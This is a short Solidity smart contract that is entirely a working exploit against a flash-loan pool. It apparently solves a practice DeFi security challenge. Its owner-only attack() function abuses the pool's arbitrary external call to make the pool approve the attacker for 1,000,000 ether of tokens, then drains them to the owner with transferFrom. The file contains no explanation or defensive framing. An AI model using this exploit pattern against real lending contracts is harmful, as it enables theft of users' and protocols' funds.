// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

interface IFlashLender {
    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data) external returns (bool);
}

contract TrustBreaker {
    address _owner;
    IFlashLender _pool;
    IERC20 _token;

    constructor(address pool_, address token_) {
        _owner = msg.sender;
        _pool = IFlashLender(pool_);
        _token = IERC20(token_);
    }

    function attack() external {
        require(msg.sender == _owner, "UNAUTHORIZED attack");
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), 1_000_000 ether);
        _pool.flashLoan(0, address(this), address(_token), data);
        _token.transferFrom(address(_pool), _owner, 1_000_000 ether);
    }
}
